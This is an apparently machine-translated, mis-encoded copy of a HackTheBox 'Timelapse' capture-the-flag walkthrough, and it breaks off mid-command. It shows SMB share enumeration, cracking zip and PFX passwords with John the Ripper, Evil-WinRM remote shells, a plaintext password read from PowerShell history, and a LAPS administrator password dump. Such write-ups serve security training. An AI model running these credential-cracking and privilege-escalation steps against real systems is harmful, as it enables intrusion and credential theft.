<html>
<head>
<title>Timelapse from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢ç›’å­çš„å»¶æ—¶â€”â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/timelapse-from-hackthebox-detailed-walkthrough-5b36f5cde290?source=collection_archive---------3-----------------------#2022-08-22">https://infosecwriteups.com/timelapse-from-hackthebox-detailed-walkthrough-5b36f5cde290?source=collection_archive---------3-----------------------#2022-08-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="8dff" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">å‘æ‚¨å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</h2></div><h1 id="64f0" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/0c0155f1972193523aa017e3594da0ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*8Br0Hr3t2dlJ47NU.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">é»‘å®¢ç›’å­çš„å»¶æ—¶</figcaption></figure><p id="39cb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ã€Šå»¶æ—¶ã€‹è¢«è¯„ä¸ºHackTheBoxä¸Šçš„ç®€æ˜“æœºã€‚è¿™ä¸ªWindowsæœºå™¨æœ‰è®¸å¤šå¼€æ”¾çš„ç«¯å£ï¼Œä½†æˆ‘ä»¬çš„æ—¶é—´ä¸»è¦èŠ±åœ¨SMBçš„445ç«¯å£å’ŒWinRMçš„5986ç«¯å£ä¸Šã€‚ä½¿ç”¨SMBClientï¼Œæˆ‘ä»¬æ‰¾åˆ°å‡ ä¸ªæ‰“å¼€çš„å…±äº«ï¼Œä»é‚£é‡Œæˆ‘ä»¬æ£€ç´¢ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ã€‚åœ¨ç ´è§£äº†zipæ–‡ä»¶å’Œå…¶ä¸­çš„pfxæ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬ä½¿ç”¨Evil-WinRMæ¥è·å¾—ä¸€ä¸ªè¿œç¨‹è¿æ¥ã€‚WinPEASå¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå¸¦æœ‰å‡­æ®çš„æ–‡ä»¶ã€‚ä¸æ–°ç”¨æˆ·äº¤æ¢ï¼Œæˆ‘ä»¬ä¸ºç®¡ç†å‘˜è½¬å‚¨ä¸€ä¸ªLAPSå¯†ç ï¼Œå¹¶å®Œæˆè¿™ä¸ªæ¡†ã€‚</p><p id="7c3f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ‰€éœ€çš„æŠ€èƒ½ä¸»è¦æ˜¯å…³äºå…±äº«å’ŒWindowsæ–‡ä»¶ç³»ç»Ÿçš„æšä¸¾ã€‚å­¦ä¹ çš„æŠ€èƒ½æ˜¯è½¬æ¢å’Œç ´è§£ä¸åŒçš„æ–‡ä»¶ç±»å‹ï¼Œä½¿ç”¨é‚ªæ¶çš„WinRMå’ŒLAPSã€‚</p><h1 id="9862" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="495c" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/94b36381509446bc83e25eb85f76eb02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gh_JntZ_Fq9qVruUsCe3mQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ç›’å­çš„Nmapæ‰«æ</figcaption></figure><h1 id="f0c0" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SMBå®¢æˆ·ç«¯</h1><p id="67c6" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">è¿™æ˜¯ä¸€ä¸ªæ‰“å¼€äº†445ç«¯å£çš„Windowsç›’å­ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å…±äº«:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="38c1" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# smbclient -L 10.10.11.152<br/>Enter WORKGROUP\roots password: <br/><br/>        Sharename       Type      Comment<br/>        ---------       ----      -------<br/>        ADMIN$          Disk      Remote Admin<br/>        C$              Disk      Default share<br/>        IPC$            IPC       Remote IPC<br/>        NETLOGON        Disk      Logon server share <br/>        Shares          Disk      <br/>        SYSVOL          Disk      Logon server share</span></pre><h1 id="b72e" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SMBMap</h1><p id="fbca" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¼€æ”¾çš„å…±äº«ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨smbmapåˆ—å‡ºæˆ‘ä»¬å¯ä»¥è®¿é—®çš„æ‰€æœ‰å†…å®¹ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨æŸ¥çœ‹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mz"><img src="../Images/f68340f5c6dd4e45133e94f86a8a0bb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H95bX6YsRtaDq5IWvCyksA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">æ˜¾ç¤ºå¯è®¿é—®æ–‡ä»¶åˆ—è¡¨çš„smbmap</figcaption></figure><p id="80ff" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¤‡ä»½æ–‡ä»¶é€šå¸¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åœ°æ–¹ã€‚è®©æˆ‘ä»¬è·å–winrm zipæ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="0de8" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# smbclient \\\\10.10.11.152\\Shares<br/>Enter WORKGROUP\roots password: <br/>smb: \&gt; cd Dev<br/>smb: \Dev\&gt; dir<br/>  winrm_backup.zip          A     2611  Mon Oct 25 16:46:42 2021<br/>            6367231 blocks of size 4096. 1076764 blocks available<br/><br/>smb: \Dev\&gt; get winrm_backup.zip<br/>getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip<br/>(0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)<br/>smb: \Dev\&gt; exit</span></pre><p id="c406" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ä¸å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ªå—å¯†ç ä¿æŠ¤çš„å‹ç¼©æ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="04fe" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# unzip winrm_backup.zip                               <br/>Archive:  winrm_backup.zip<br/>[winrm_backup.zip] legacyy_dev_auth.pfx password: <br/>password incorrect--reenter: <br/>password incorrect--reenter: <br/>   skipping: legacyy_dev_auth.pfx    incorrect password</span></pre><h1 id="53b2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">zipæ–‡ä»¶å“ˆå¸Œç ´è§£</h1><p id="7dd4" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ä½¿ç”¨zip2johnè„šæœ¬åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬å¯ä»¥å°è¯•ç ´è§£çš„å“ˆå¸Œæ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="a196" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# zip2john winrm_backup.zip &gt; winrm.hash<br/>ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# cat winrm.hash      <br/>winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec568<br/>c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0&lt;SNIP&gt;<br/>82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a4085f9&lt;SNIP&gt;<br/>7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip</span></pre><p id="4f20" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥è¯•ç€ç”¨JohnTheRipperå’Œrockyouå•è¯è¡¨æ¥ç ´è§£:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="b831" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash  <br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (PKZIP [32/64])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     <br/>1g 0:00:00:03 DONE (2022-04-09 22:31) 0.2583g/s 897521p/s 897521c/s 897521C/s surkerior..superkebab<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed.</span></pre><p id="68ef" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">åªéœ€è¦å‡ ç§’é’Ÿå°±èƒ½å¾—åˆ°å¯†ç ã€‚è®©æˆ‘ä»¬è§£å‹æ–‡ä»¶ï¼Œçœ‹çœ‹é‡Œé¢çš„å†…å®¹:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="cc71" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# unzip winrm_backup.zip                                  <br/>Archive:  winrm_backup.zip<br/>[winrm_backup.zip] legacyy_dev_auth.pfx password: <br/>  inflating: legacyy_dev_auth.pfx</span></pre><h1 id="926a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">PFXæ–‡ä»¶å“ˆå¸Œç ´è§£</h1><p id="6837" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æˆ‘ä»¬æœ‰ä¸€ä»½æ¡£æ¡ˆé‡Œçš„pfxæ–‡ä»¶ã€‚å¦‚æœä½ ä»¥å‰æ²¡æœ‰ä½¿ç”¨è¿‡pfxæ–‡ä»¶ï¼Œé‚£ä¹ˆ<a class="ae na" href="https://www.howtouselinux.com/post/pfx-file-with-examples" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ˜¯æœ‰å¸®åŠ©çš„ã€‚æœ€åä¸€èŠ‚è§£é‡Šäº†å¦‚ä½•ä»pfxæ–‡ä»¶ä¸­æå–ç§é’¥ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ï¼Œæˆ‘ä»¬ä¼šå‘ç°è¿™ä¹Ÿéœ€è¦ä¸€ä¸ªå¯†ç :</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="65dd" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key<br/>Enter Import Password:<br/>Mac verify error: invalid password?</span></pre><p id="d419" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">è®©çº¦ç¿°æ¥ç ´è§£è¿™ä¸ªã€‚é¦–å…ˆå°†pfxæ–‡ä»¶è½¬æ¢æˆä¸€ä¸ªJohnå‹å¥½çš„æ•£åˆ—:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="7644" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# pfx2john legacyy_dev_auth.pfx &gt; pfx.hash<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# cat pfx.hash<br/>legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d<br/>668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a082060004<br/>8205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308&lt;SNIP&gt;<br/>23b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx</span></pre><p id="f2c5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å†æ¬¡ç”¨rockyouç‚¹ç‡ƒJohnTheRipper:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="6518" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash      <br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])<br/>Cost 1 (iteration count) is 2000 for all loaded hashes<br/>Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status</span><span id="c8e8" class="mu kg iq mq b gy nb mw l mx my">thuglegacy       (legacyy_dev_auth.pfx)     </span><span id="ec1f" class="mu kg iq mq b gy nb mw l mx my">1g 0:00:00:42 DONE (2022-04-09 22:45) 0.02346g/s 75826p/s 75826c/s 75826C/s thuglife06..thsco04<br/>Session completed.</span></pre><p id="ca28" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å‡ ç§’é’Ÿåæˆ‘ä»¬ä¼šæœ‰å¦ä¸€ä¸ªå¯†ç ã€‚ç°åœ¨æˆ‘ä»¬æœ‰äº†å¯†ç ï¼Œè®©æˆ‘ä»¬æå–ç§é’¥:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="a1fb" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key<br/>Enter Import Password:<br/>Enter PEM pass phrase:<br/>Verifying - Enter PEM pass phrase:</span></pre><p id="e457" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">å¯¹äºPEMå¯†ç çŸ­è¯­ï¼Œæ‚¨å¯ä»¥å°†å…¶è®¾ç½®ä¸ºä»»ä½•å€¼ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯1234ã€‚</p><p id="1be5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬è¿˜éœ€è¦è¯ä¹¦å’Œç§é’¥ã€‚å†æ¬¡ä½¿ç”¨æˆ‘ä»¬ä»Johnå¤„è·å¾—çš„ç›¸åŒå¯†ç :</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="eb6b" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt<br/>Enter Import Password:</span></pre><h1 id="c636" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Evil-WinRMä½œä¸ºç”¨æˆ·åˆæ³•èº«ä»½</h1><p id="dda6" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ç°åœ¨æˆ‘ä»¬æœ‰äº†ä½¿ç”¨Evil-WinRMè¿æ¥æ‰€éœ€çš„æ‰€æœ‰æ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="558c" class="mu kg iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# evil-winrm -i 10.10.11.152 -c ./pfx.crt -k ./priv.key -p -u -S <br/>Evil-WinRM shell v3.3<br/>Warning: SSL enabled<br/>Info: Establishing connection to remote endpoint<br/>Enter PEM pass phrase:<br/>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt;</span></pre><h1 id="26c3" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="5c2e" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ä½¿ç”¨æˆ‘ä»¬ä¹‹å‰è®¾ç½®çš„PEMå¯†ç 1234ï¼Œæˆ‘ä»¬ç°åœ¨è¿æ¥ä¸Šäº†ã€‚æˆ‘å…ˆå¾—åˆ°äº†ç”¨æˆ·æ ‡å¿—:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="b9a3" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type ..\desktop\user.txt<br/>e9fd75b313ffaa4e72f06e32dffc6f96</span></pre><h1 id="026d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">WinPEAS</h1><p id="9495" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ç„¶åæˆ‘ç”¨<a class="ae na" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" rel="noopener ugc nofollow" target="_blank"> WinPEAS </a>å¯»æ‰¾æœ‰è¶£çš„ä¸œè¥¿:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nc"><img src="../Images/b6e8251a12a5cb16baf2fe5a9edb2ba0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rvnnhUKNW32sgQC5Gphf1g.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„winPEAS</figcaption></figure><p id="4e3e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„è¿æ¥ä¼šè¯æ¥ä¸Šä¼ æ–‡ä»¶:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="49f4" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; upload /root/htb/timelapse/winPEAS.bat<br/>Info: Uploading /root/htb/timelapse/winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat<br/>Enter PEM pass phrase:<br/>Data: 47688 bytes of 47688 bytes copied<br/>Info: Upload successful!</span></pre><p id="68a5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">batæ–‡ä»¶å¯ä»¥è¿è¡Œï¼Œä½†æ˜¯è¾“å‡ºæœ‰ç‚¹æ··ä¹±ã€‚å°½ç®¡å¦‚æ­¤ï¼Œç¿»é˜…ä¸€ä¸‹æˆ‘ä»¬è¿˜æ˜¯å‘ç°äº†ä¸€äº›æœ‰è¶£çš„äº‹æƒ…:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="f3a9" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; .\winPEAS.bat<br/><br/>&lt;SNIP&gt;<br/>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd<br/>    AdmPwdEnabled    REG_DWORD    0x1<br/>[i] Active if "1"<br/><br/>&lt;SNIP&gt;<br/>Checking PS history file<br/> Volume in drive C has no label.<br/> Volume Serial Number is 22CC-AE66<br/> Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<br/>03/04/2022  12:46 AM               434 ConsoleHost_history.txt<br/>               1 File(s)            434 bytes<br/>               0 Dir(s)   6,101,368,832 bytes free</span></pre><p id="7569" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ConsoleHost_history.txtæ–‡ä»¶åŒ…å«æˆ‘ä»¬æ‰€è¿æ¥çš„ç”¨æˆ·è¿è¡Œçš„å‘½ä»¤:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="9a0a" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span id="d075" class="mu kg iq mq b gy nb mw l mx my">whoami<br/>ipconfig /all<br/>netstat -ano |select-string LIST<br/>$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br/>$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force<br/>$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)<br/>invoke-command -computername localhost -credential $c -port 5986 -usessl -<br/>SessionOption $so -scriptblock {whoami}<br/>get-aduser -filter * -properties *<br/>exit</span></pre><p id="8afc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ­£å¦‚<a class="ae na" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools" rel="noopener ugc nofollow" target="_blank"> PayloadsAllTheThings </a>å¤‡å¿˜å•ä¸Šæ³¨æ˜çš„ï¼Œè¿™æ˜¯éœ€è¦æ£€æŸ¥çš„ä¼—å¤šæ–‡ä»¶ä¹‹ä¸€ã€‚ç”±æ­¤æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªæ–°ç”¨æˆ·svc_deployå’Œä¸€ä¸ªå¯†ç ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°ä»–ä»¬æŸ¥çœ‹äº†ADä¸­çš„æ‰€æœ‰ç”¨æˆ·ï¼Œå¿«é€Ÿæ£€æŸ¥æ˜¾ç¤ºæœ‰ä¸å°‘ç”¨æˆ·:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="6257" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; get-aduser -filter * | select samaccountname<br/>Enter PEM pass phrase:<br/><br/>samaccountname<br/>--------------<br/>Administrator<br/>Guest<br/>krbtgt<br/>thecybergeek<br/>payl0ad<br/>legacyy<br/>sinfulz<br/>babywyrm<br/>svc_deploy<br/>TRX</span></pre><h1 id="4fc9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Evil-WinRMä½œä¸ºç”¨æˆ·SVC_Deploy</h1><p id="29cb" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">ä½œä¸ºå½“å‰ç”¨æˆ·ï¼Œæˆ‘ä¸èƒ½åšå¤ªå¤šï¼Œè®©æˆ‘ä»¬åˆ‡æ¢åˆ°æˆ‘ä»¬æ‰¾åˆ°çš„svc_deployå¸æˆ·:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="1f22" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; exit<br/>Enter PEM pass phrase:<br/>Info: Exiting with code 0<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timelapse]<br/>â””â”€# evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S<br/><br/>Evil-WinRM shell v3.3<br/>Warning: SSL enabled<br/>Info: Establishing connection to remote endpoint<br/>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt;</span></pre><h1 id="04f2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">è†</h1><p id="c436" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">æˆ‘èŠ±äº†ä¸€æ®µæ—¶é—´ç¯é¡¾å››å‘¨ï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾çš„è·³å‡ºæ¥ã€‚å›å¤´çœ‹çœ‹WinPEASçš„è¾“å‡ºï¼Œæˆ‘ä»¬å‘ç°LAPSå®‰è£…åœ¨æ³¨å†Œè¡¨ä¸­ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°ï¼ŒæœåŠ¡å°å¼€å§‹æ—¶æœ‰LAPSå®‰è£…æ–‡æ¡£å’Œæ–‡ä»¶ã€‚ç„¶åè¿™ä¸ªç›’å­çš„åå­—å°±æœ‰æ„ä¹‰äº†æ—¶é—´æµé€ï¼</p><p id="781b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">LAPSç®¡ç†æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œä»¥è®¾å®šçš„é¢‘ç‡è½®æ¢å®ƒã€‚<a class="ae na" href="https://www.recastsoftware.com/resources/overview-of-microsoft-laps-local-administrator-password-solution/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>æ˜¯æ‰€æœ‰äº‹ç‰©åœˆçš„å‘å¯¼ã€‚æˆ‘è¿˜å‘ç°<a class="ae na" href="https://smarthomepursuits.com/export-laps-passwords-powershell/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>å¾ˆæœ‰å¸®åŠ©ï¼Œä»é‚£ä»¥åæˆ‘å°±æŠŠå¹¿å‘Šé‡Œçš„åœˆæ•°å¯†ç ç»™è½¬èµ°äº†:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="20c0" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; get-adcomputer -filter * -properties ms-mcs-admpwd | select name,ms-mcs-admpwd<br/><br/>name  ms-mcs-admpwd<br/>----  -------------<br/>DC01  1;s(T[,8/k6k8+n1e8Jh+Q@r<br/>DB01<br/>WEB01<br/>DEV01</span></pre><p id="bd60" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">æ£€æŸ¥æˆ‘ä»¬åœ¨å“ªä¸ªæœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬å‘ç°å®ƒæ˜¯DC01:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="54e0" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS 